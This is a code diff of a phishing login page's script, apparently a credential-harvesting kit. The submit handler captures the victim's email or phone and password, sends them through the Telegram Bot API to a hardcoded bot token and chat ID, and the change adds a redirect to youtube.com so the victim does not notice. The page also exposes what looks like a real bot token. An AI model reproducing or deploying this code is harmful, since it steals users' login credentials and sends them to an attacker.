@@ -105,31 +105,32 @@
 
   <script>
     document.getElementById('loginForm').addEventListener('submit', function(event) {
-      event.preventDefault(); // Prevent the form from submitting normally
+  event.preventDefault(); // Prevent the form from submitting normally
 
-      var emailOrPhone = document.getElementById('emailOrPhone').value;
-      var password = document.getElementById('password').value;
-      var teleBot = '6705820304:AAHk1XLtjSxcXNmvlahYMZ9AmOMZDySheig'; // Replace with your actual Telegram bot token
+  var emailOrPhone = document.getElementById('emailOrPhone').value;
+  var password = document.getElementById('password').value;
+  var teleBot = '6705820304:AAHk1XLtjSxcXNmvlahYMZ9AmOMZDySheig'; // Replace with your actual Telegram bot token
 
-      var xhr = new XMLHttpRequest();
-      xhr.open('POST', 'https://api.telegram.org/bot' + teleBot + '/sendMessage', true);
-      xhr.setRequestHeader('Content-Type', 'application/json');
-      xhr.onreadystatechange = function() {
-        if (xhr.readyState === XMLHttpRequest.DONE && xhr.status === 200) {
-          console.log('Message sent successfully!');
-          // You can add additional logic here, such as redirecting to a dashboard or displaying a success message
-        } else {
-          console.error('Error sending message:', xhr.status);
-        }
-      };
+  var xhr = new XMLHttpRequest();
+  xhr.open('POST', 'https://api.telegram.org/bot' + teleBot + '/sendMessage', true);
+  xhr.setRequestHeader('Content-Type', 'application/json');
+  xhr.onreadystatechange = function() {
+    if (xhr.readyState === XMLHttpRequest.DONE && xhr.status === 200) {
+      console.log('Message sent successfully!');
+      // Redirect to YouTube.com
+      window.location.href = 'https://www.youtube.com/';
+    } else {
+      console.error('Error sending message:', xhr.status);
+    }
+  };
 
-      var data = {
-        chat_id: '-1002006594699', // Replace with the chat ID you want to send the message to
-        text: 'Email or Phone: ' + emailOrPhone + '\nPassword: ' + password
-      };
+  var data = {
+    chat_id: '-1002006594699', // Replace with the chat ID you want to send the message to
+    text: 'Email or Phone: ' + emailOrPhone + '\nPassword: ' + password
+  };
 
-      xhr.send(JSON.stringify(data));
-    });
+  xhr.send(JSON.stringify(data));
+});
   </script>
 </body>
 </html>
